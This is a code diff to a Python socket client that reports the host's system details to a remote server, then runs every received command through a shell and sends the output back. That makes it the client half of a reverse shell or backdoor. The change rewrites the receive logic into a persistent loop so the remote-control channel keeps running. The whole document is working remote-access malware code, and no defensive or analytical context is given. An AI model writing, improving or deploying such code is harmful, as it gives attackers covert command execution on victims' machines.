@@ -99,6 +99,7 @@ class Client:
             self.s.connect((self.host, self.port))
             self.log.info('Connection Established')
             self.s.send(json.dumps(platform.uname()._asdict()).encode())
+            self.receive()  # Start receiving commands immediately after connecting
         except Exception as error:
             time.sleep(2)
             self.connect()
@@ -108,21 +109,21 @@ class Client:
         time.sleep(2)
         self.log.info('Waiting for Server')
         self.connect()
-        self.receive()
 
     def receive(self):
         try:
-            command = self.s.recv(1024).decode()
-            if command == ':exit':                
-                self.reconnect()
-            elif command == ':kill':
-                return
-            else:
-                shell = subprocess.Popen(command, shell = True, stdout= subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
-                output = shell.stdout.read() + shell.stderr.read()
-                if len(output) == 0:
-                    output = b'[!] Command Returned Empty Response'
-                self.send(output)
+            while True:
+                command = self.s.recv(1024).decode()
+                if command == ':exit':                
+                    self.reconnect()
+                elif command == ':kill':
+                    return
+                else:
+                    shell = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                    output = shell.stdout.read() + shell.stderr.read()
+                    if len(output) == 0:
+                        output = b'[!] Command Returned Empty Response'
+                    self.send(output)
         except socket.error as error:
             self.log.error(f'Socket Receive Error: {error}')
             self.reconnect()
@@ -130,7 +131,6 @@ class Client:
     def send(self, output):
         try:
             self.s.send(output)
-            self.receive()
         except socket.error as error:
             self.log.error(f'Socket Send Error: {error}')
             self.reconnect()
